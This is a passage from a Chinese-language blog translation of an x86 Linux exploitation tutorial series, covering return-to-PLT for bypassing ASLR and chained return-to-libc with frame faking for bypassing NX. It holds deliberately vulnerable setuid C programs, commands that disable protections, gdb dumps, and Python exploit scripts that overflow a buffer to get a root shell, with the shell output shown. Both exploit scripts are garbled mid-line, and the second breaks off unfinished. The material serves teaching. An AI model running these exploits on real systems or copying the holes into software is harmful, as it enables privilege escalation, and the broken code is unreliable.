</code></pre><h3 id="调用‘function-PLT’"><a href="#调用‘function-PLT’" class="headerlink" title="调用‘function@PLT’"></a>调用‘function@PLT’</h3><p>要了解过程链接表（Procedural Linkage Table(PLT)）,先来简单介绍一下共享库！</p>
<p>不同于静态库的是，共享库的text段在多个进程间共享，但它的数据段在每个进程中是唯一的。这样设计可以减少内存和磁盘空间。正是text段在多个进程间共享，其必须只有读和执行权限。没有了写权限，动态链接器不能在text段内部重定位数据描述符(data symbol)或者函数地址。这样一来，程序运行期间，动态链接器是如何在不修改text段的情况下，重定位共享库描述符的呢? 利用PIC!</p>
<pre><code>什么是PIC呢？
</code></pre><p>位置独立代码(Position Independent Code(PIC))用来解决这个问题： 尽管共享库的text段在加载期间执行重定为，也能确保它能在多个进程中共享。PIC通过一层间接寻址来达到这个目的。共享库的text段中没有绝对虚拟地址来替代全局描述符和函数引用，而是指向数据段中的一个特定表。这个表用来存放全局描述符和函数的绝对虚拟地址。动态链接器作为重定位的一部分会填充这个表。因此，在重定位时，只有数据段被修改，而text段依然完好无顺。</p>
<p>动态链接器使用下面两种方法来重定位PIC中的全局描述符和函数：</p>
<ul>
<li><u>全局偏移表(Global Offset Table(GOT))</u>: 全局偏移表为每个全局变量分配一个4字节的表项，这4个字表项中含有全局变量的地址。当代码段中的一条指令引用一个全局变量时，这条指令指向的是GOT中的一个表项，而不是全局变量的绝对虚拟地址。当共享库被加载时，动态链接库会重定位这个GOT表项。因此，PIC利用GOT通过一层间接寻址来重定位全局描述符.</li>
<li><u>过程链接表(Procedural Linkage Table(PLT)): 过程链接表含有每个全局函数的存根代码。text段中的一条call指令不会直接调用这个函数(‘function’)，而是调用这个存根代码(function@PLT)。存根代码在动态链接器的帮助下，解析函数地址并将其拷贝到GOT(GOT[n])中。解析过程只发生在第一次调用函数(‘function’)的时候,之后代码段中的call指令调用存根代码(function@PLT)而不是调用动态链接器去解析函数地址(‘function’)。存根代码直接从GOT(GOT[n])获取函数地址并跳转到那里。因此，PIC利用PLT通过两层间接寻址来重定位函数地址</u></li>
</ul>
<p>很高兴你知道了PIC并能理解它能保证共享库的text段的完整性，因此能帮助共享库的text段再许多进程间共享！ 但你是否怀疑过，为什么可执行文件的text段并不在任何进程间共享，也需要有个GOT表项或者PLT存根代码呢？这是出于安全保护机制的考虑。如今默认情况下，text段只提供读和执行权限并没有写权限(R_X)。这种保护机制并允许动态链接库对text段进行写操作，因此也就不能重定位text段内部的数据描述符或函数地址。为了让动态链接器能重定位，可执行文件同共享库一样也需要GOT表项和PLT存根代码。</p>
<p><u>代码样例</u>：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//eg.c</span></div><div class="line"><span class="comment">//$gcc -g -o eg eg.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, argv[<span class="number">1</span>]);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>下面的汇编代码说明了’printf’并不是直接被调用，而是其相应的PLT代码 ‘printf@PLT’被调用了。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x080483e4</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x080483e5</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x080483e7</span> &lt;+<span class="number">3</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp</div><div class="line"> <span class="number">0x080483ea</span> &lt;+<span class="number">6</span>&gt;: sub $<span class="number">0x10</span>,%esp</div><div class="line"> <span class="number">0x080483ed</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax</div><div class="line"> <span class="number">0x080483f0</span> &lt;+<span class="number">12</span>&gt;: add $<span class="number">0x4</span>,%eax</div><div class="line"> <span class="number">0x080483f3</span> &lt;+<span class="number">15</span>&gt;: mov (%eax),%edx</div><div class="line"> <span class="number">0x080483f5</span> &lt;+<span class="number">17</span>&gt;: mov $<span class="number">0x80484e0</span>,%eax</div><div class="line"> <span class="number">0x080483fa</span> &lt;+<span class="number">22</span>&gt;: mov %edx,<span class="number">0x4</span>(%esp)</div><div class="line"> <span class="number">0x080483fe</span> &lt;+<span class="number">26</span>&gt;: mov %eax,(%esp)</div><div class="line"> <span class="number">0x08048401</span> &lt;+<span class="number">29</span>&gt;: call <span class="number">0x8048300</span> &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line"> <span class="number">0x08048406</span> &lt;+<span class="number">34</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x0804840b</span> &lt;+<span class="number">39</span>&gt;: leave </div><div class="line"> <span class="number">0x0804840c</span> &lt;+<span class="number">40</span>&gt;: ret </div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble <span class="number">0x8048300</span></div><div class="line">Dump of assembler code <span class="keyword">for</span> function <span class="built_in">printf</span>@plt:</div><div class="line"> <span class="number">0x08048300</span> &lt;+<span class="number">0</span>&gt;: jmp *<span class="number">0x804a000</span></div><div class="line"> <span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"> <span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>在’printf’第一次被调用前，其相应的GOT表项(0x804a000)指回到PLT代码(0x8048306)本身。因此，当printf函数第一次被调用时，其相应的函数地址通过动态链接器来解析。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0x08048306</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>现在printf被调用之后，其相应的GOT表项含有printf的函数地址(如下图):</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">(gdb) x/<span class="number">1</span>xw <span class="number">0x804a000</span></div><div class="line"><span class="number">0x804a000</span> &lt;<span class="built_in">printf</span>@got.plt&gt;: <span class="number">0xb7e6e850</span></div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p><u>注意 1</u>: 如果你想了解PLT和GOT的更多信息，可以阅读<a href="">这篇</a>文章</p>
<p><u>注意 2</u>: 我会在别的文中单独谈谈动态链接器是如何解析libc函数地址的。现在只要记住下面两条语句(printf@PLT的一部分）是用来解析函数地址的！</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x08048306</span> &lt;+<span class="number">6</span>&gt;: push $<span class="number">0x0</span></div><div class="line"><span class="number">0x0804830b</span> &lt;+<span class="number">11</span>&gt;: jmp <span class="number">0x80482f0</span></div></pre></td></tr></table></figure>
<p>了解这个之后，我们可以知道攻击者并不需要知道libc函数的地址来调用libc函数，只要简单通过’function@PLT’（在执行前知道）就可以调用了。</p>
<p><u>漏洞代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="comment">/* Eventhough shell() function isnt invoked directly, its needed here since 'system@PLT' and 'exit@PLT' stub code should be present in executable to successfully exploit it. */</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span> </span>&#123;</div><div class="line"> system(<span class="string">"/bin/sh"</span>);</div><div class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> i=<span class="number">0</span>;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>编译命令</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p>现在反汇编可执行文件’vuln’,我们可以找出’system@PLT’与’exit@PLT’的地址</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble shell</div><div class="line">Dump of assembler code <span class="keyword">for</span> function shell:</div><div class="line"> <span class="number">0x08048474</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x18</span>,%esp</div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">6</span>&gt;: movl $<span class="number">0x80485a0</span>,(%esp)</div><div class="line"> <span class="number">0x08048481</span> &lt;+<span class="number">13</span>&gt;: call <span class="number">0x8048380</span> &lt;system@plt&gt;</div><div class="line"> <span class="number">0x08048486</span> &lt;+<span class="number">18</span>&gt;: movl $<span class="number">0x0</span>,(%esp)</div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x80483a0</span> &lt;<span class="built_in">exit</span>@plt&gt;</div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>利用这些地址，我们就可以写出绕过ASLR(与NX)的漏洞利用代码！</p>
<p><u>漏洞利用代码</u>：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#exp.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">system = 0x8048380</div><div class="line">exit = 0x80483a0</div><div class="line">system_arg = 0x80485b5     #Obtained from hexdump output of executable 'vuln'</div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> return struct.pack("&lt;I",numystem + exit + system_arg</div><div class="line">buf = "A" * 272</div><div class="line">buf += conv(system)</div><div class="line">buf += conv(exit)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div></pre></td></tr></table></figure>
<p>执行上述程序就可以获取root shell，如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
<p><u>注意</u>： 为了获取这个root shell，可执行文件必须包含’system@PLT’与’exit@PLT’代码。在<a href="http://www.csyssec.org/20170101/bypassaslr-gotgor" target="_blank" rel="external">第三篇</a>中，我会谈谈利用GOT覆盖与GOT解引用技术，在可执行文件中并没有需要的PLT存根代码并且系统已经打开了ASLR的情况下，攻击者如何调用libc函数。 </p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/bypassaslr-returntoplt" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-chainingreturntolibc"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170101/chainingreturntolibc/">Return-to-libc链接绕过NX</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170101/chainingreturntolibc/" class="article-date">
	  <time datetime="2017-01-01T02:39:58.000Z" itemprop="datePublished">一月 1, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者: <a href="http://www.csyssec.org/about" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<p><strong>CSysSec注</strong>： 本系列文章译自安全自由工作者<a href="https://sploitfun.wordpress.com/about-2/" target="_blank" rel="external">Sploitfun</a>的漏洞利用系列博客，从经典栈缓冲区漏洞利用堆漏洞利用，循序渐进，是初学者不可多得的好材料，CSysSec计划在原基础上不断添加相关漏洞利用技术以及相应的Mitigation方法，欢迎推荐或自荐文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/chainingreturntolibc" target="_blank" rel="external">Linux(X86)漏洞利用系列-Return-to-libc链接绕过NX</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
<hr>
<blockquote>
<ul>
<li>0x01 什么Return-to-libc链接</li>
<li>0x02 什么是帧欺骗</li>
<li>0x03 leave ret指令是如何调用其上方libc函数的</li>
</ul>
</blockquote>
<p><u>阅读基础</u>:</p>
<ul>
<li>1.<a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a></li>
<li>2.<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">Return-to-libc绕过NX</a></li>
</ul>
<p><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
<h3 id="什么是Return-to-libc链接"><a href="#什么是Return-to-libc链接" class="headerlink" title="什么是Return-to-libc链接"></a>什么是Return-to-libc链接</h3><p>在<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中可以看出，攻击者需要调用多个libc函数才能成功利用漏洞。一种链接libc函数的简单方法就是将不同libc函数依次放在栈中。但由于函数参数的原因，这是不可能的。现在你可能还不明白，没关系，继续往下读就好。</p>
<p><u>漏洞代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> seteuid(getuid()); <span class="comment">/* Temporarily drop privileges */</span></div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><u>注意</u>: 上述代码和<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>中的(vuln_priv.c)一样。</p>
<p><u>编译命令</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
<p>正如<a href="http://www.csyssec.org/20161231/returntolibc/" target="_blank" rel="external">前文</a>所说，链接seteuid,system和exit函数能允许我们利用漏洞代码”vuln”。但并没有这么简单直接，主要在于下面这两个问题：</p>
<ul>
<li>1.攻击者需要将两个libc函数参数或者其中一个libc函数参数与另一个libc函数地址放在栈的同一位置。显然这是不可能的(如下图所示)</li>
<li>2.seteuid_arg必须为0.由于我们的缓冲区溢出是由strcpy操作引起的，0变成了一个不好的字符。比如，strcpy函数不会将0之后的字符拷贝到栈中。</li>
</ul>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc1.jpeg" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>我们来看看如何解决上述两个问题。</p>
<p><u>问题1</u>: 为解决这个问题，Nergal在<a href="http://phrack.org/issues/58/4.html" target="_blank" rel="external">phrack</a>中提出了两个聪明的技术</p>
<ul>
<li><ol>
<li>ESP上升(ESP Lifting)</li>
</ol>
</li>
<li><ol>
<li>帧欺骗(Frame fakeing)</li>
</ol>
</li>
</ul>
<p>由于ESP lifting技术要求二进制文件在编译的时候不能设置帧指针(-fomit-frame-pointer)，这里我们只谈帧欺骗技术。 由于我们的二进制文件(vuln)含有帧指针，只好采用帧欺骗技术。</p>
<h3 id="什么是帧欺骗"><a href="#什么是帧欺骗" class="headerlink" title="什么是帧欺骗"></a>什么是帧欺骗</h3><p>这项技术不去覆盖返回地址，而是直接覆盖libc函数地址(这个例子中的seteuid函数)，我们采用”leave ret”指令来覆盖。 这让攻击者有机会将函数参数存放在栈中而不必有任何交叉，而且能调用相应的libc函数，并不会带来任何问题。</p>
<p><u>栈布局</u> 如下面栈布局所示，帧指针攻击者溢出栈并成功链接libc函数: seteuid, system与exit：</p>
<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/chainreturntolibc2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>

<p>上图中红色强调的部分是”leave ret”指令调用其上方libc函数的返回地址。举个例子，第一条”leave ret”指令(位于栈地址0xbffff1fc处)调用seteuid()，第二条”leave ret”指令(位于栈地址0xbffff20c处)调用system()，第三条”leave ret”指令(位于栈地址0xbffff21c处)调用exit().</p>
<h3 id="leave-ret指令是如何调用其上方libc函数的"><a href="#leave-ret指令是如何调用其上方libc函数的" class="headerlink" title="leave ret指令是如何调用其上方libc函数的"></a>leave ret指令是如何调用其上方libc函数的</h3><p>为了回答这个问题，首先我们要了解”leave”指令。一条”leave”指令可以翻译成:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov ebp,esp            <span class="comment">//esp = ebp</span></div><div class="line">pop ebp                <span class="comment">//ebp = *esp</span></div></pre></td></tr></table></figure>
<p>我们来反汇编main()函数，以便更进一步了解“leave ret”指令</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble main</div><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line">  ...</div><div class="line">  <span class="number">0x0804851c</span> &lt;+<span class="number">88</span>&gt;: leave                  <span class="comment">//mov ebp, esp; pop ebp;</span></div><div class="line">  <span class="number">0x0804851d</span> &lt;+<span class="number">89</span>&gt;: ret                    <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p><u>Main尾声代码</u>:</p>
<p>如上述栈布局所示，在main函数尾声代码执行之前，攻击者已经溢出栈并用fake_ebp0(0xbffff204)覆盖了main函数的ebp，以及利用”leave ret”指令地址(0x0804851c)覆盖了其返回地址。 现在当CPU要执行main函数的尾声代码时，EIP指向text地址0x0804851c（”leave ret”)。在执行过程中，会发生下面的事情：</p>
<ul>
<li>‘leave’修改了下面的寄存器<ul>
<li>esp = ebp = 0xbffff1f8</li>
<li>ebp = 0xbffff204, esp = 0xbffff1fc</li>
</ul>
</li>
<li>‘ret’执行”leave ret”指令(位于栈地址0xbffff1fc处)</li>
</ul>
<p><u>seteuid</u>: 现在EIP又重新指向text地址0x0804851c(“leave ret”). 在执行过程中，会发生下面的事情：</p>
<ul>
<li>‘leave’修改了下面的寄存器<ul>
<li>esp = ebp = 0xbffff204</li>
<li>ebp = 0xbffff214, esp =0xbffff208</li>
</ul>
</li>
<li>‘ret’执行seteuis()(位于栈地址0xbffff208). 为了能成功调用seteuid,seteuid_arg必须放在栈地址0xbffff210的偏移量8处(比如seteuid_add）</li>
<li>调用seteuid()后，”leave ret”指令(位于栈地址0xbffff20c处)开始执行</li>
</ul>
<p>可以从上面的栈布局看出，执行上述过程，栈已经按照攻击者的意图设置好，system和exit函数都能得到执行。</p>
<p><u>问题2</u>: 在我们的例子中，seteuid必须为0. 但0已经变成一个不好的字符，如何将0写在栈地址0xbffff210处呢？Nergal的同一篇文中讲了一个简单的方法。在链接libc相关函数时，前几个调用必须是strcp函数(其将一个NULL字节拷贝到seteuid_arg在栈中的位置)。</p>
<p><u>注意</u>: 但不幸地是我的libc.so.6中strcpy函数的地址是0xb7ea6200。 libc函数地址本身包含一个NULL字节(不好的字符!)。 因此，strcpy不能成功地利用漏洞代码。sprintf（函数地址是0xb7e6e8d0)可以用来替代strcpy。使用sprintf时，NULL字节被拷贝到seteuid_arg在栈中的位置。</p>
<p>因此链接下面的libc函数可以解决上面提到的两个问题并成功获取root shell:</p>
<pre><code>sprintf|sprintf|sprintf|sprintf|seteuid|system|exit
</code></pre><p><u>漏洞利用代码</u>:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">fake_ebp0 = <span class="number">0xbffff1a0</span></div><div class="line">fake_ebp1 = <span class="number">0xbffff1b8</span></div><div class="line">fake_ebp2 = <span class="number">0xbffff1d0</span></div><div class="line">fake_ebp3 = <span class="number">0xbffff1e8</span></div><div class="line">fake_ebp4 = <span class="number">0xbffff204</span></div><div class="line">fake_ebp5 = <span class="number">0xbffff214</span></div><div class="line">fake_ebp6 = <span class="number">0xbffff224</span></div><div class="line">fake_ebp7 = <span class="number">0xbffff234</span></div><div class="line">leave_ret = <span class="number">0x0804851c</span></div><div class="line">sprintf_addr = <span class="number">0xb7e6e8d0</span></div><div class="line">seteuid_addr = <span class="number">0xb7f09720</span></div><div class="line">system_addr = <span class="number">0xb7e61060</span></div><div class="line">exit_addr = <span class="number">0xb7e54be0</span></div><div class="line">sprintf_arg1 = <span class="number">0xbffff210</span></div><div class="line">sprintf_arg2 = <span class="number">0x80485f0</span></div><div class="line">sprintf_arg3 = <span class="number">0xbffff23c</span></div><div class="line">system_arg = <span class="number">0x804829d</span></div><div class="line">exit_arg = <span class="number">0xffffffff</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num* <span class="number">264</span> </div><div class="line">buf += conv(fake_ebp0) </div><div class="line">buf += conv(leave_ret) </div><div class="line">#Below four <span class="built_in">stack</span> frames are <span class="keyword">for</span> <span class="built_in">sprintf</span> (to setup seteuid arg )</div><div class="line">buf += conv(fake_ebp1) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += conv(sprintf_arg2) </div><div class="line">buf += conv(sprintf_arg3) </div><div class="line">buf += conv(fake_ebp2) </div><div class="line">buf += conv(sprintf_addr) </div><div class="line">buf += conv(leave_ret) </div><div class="line">sprintf_arg1 += <span class="number">1</span></div><div class="line">buf += conv(sprintf_arg1) </div><div class="line">buf += 